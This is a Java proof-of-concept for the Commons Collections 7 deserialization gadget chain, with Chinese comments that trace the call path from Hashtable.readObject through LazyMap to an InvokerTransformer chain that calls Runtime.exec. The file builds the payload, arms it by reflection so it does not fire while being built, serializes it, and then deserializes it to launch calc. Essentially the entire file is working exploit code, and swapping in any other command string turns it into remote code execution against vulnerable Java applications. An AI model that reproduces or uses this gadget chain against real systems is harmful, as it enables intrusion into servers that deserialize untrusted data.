package CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * 测试环境：3.1-3.2.1，jdk1.7,1.8
 *
 * 这里仍然是想法子触发LazyMap.get()。Hashtable 的 readObject 中.
 * 遇到 hash 碰撞时, 通过调用一个对象的 equals 方法对比两个对象判断是真的 hash 碰撞.
 * 这里的 equals 方法是 AbstractMap 的 equals 方法。
 *
 * 这里是 jdk 1.7 的，不同版本 HashMap readObject 可能略有不同
 *   ->Hashtable.readObject()
 *       ->Hashtable.reconstitutionPut()
 *             ->AbstractMapDecorator.equals
 *                 ->AbstractMap.equals()
 *                   ->LazyMap.get.get()
 *                     ->ChainedTransformer.transform()
 *                       ->ConstantTransformer.transform()
 *                         ->InvokerTransformer.transform()
 *                           ->…………
 */
public class CommonsCollections7 {

    public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException {

        Transformer[] fakeTransformer = new Transformer[]{};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        //先设置假的 Transformer 数组，防止生成时执行命令
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);

        //LazyMap实例
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, "test");
        hashtable.put(lazyMap2, "test");


        //通过反射设置真的 ransformer 数组
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);

        //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=>yy，所以这里要移除
        lazyMap2.remove("yy");

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashtable);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

}
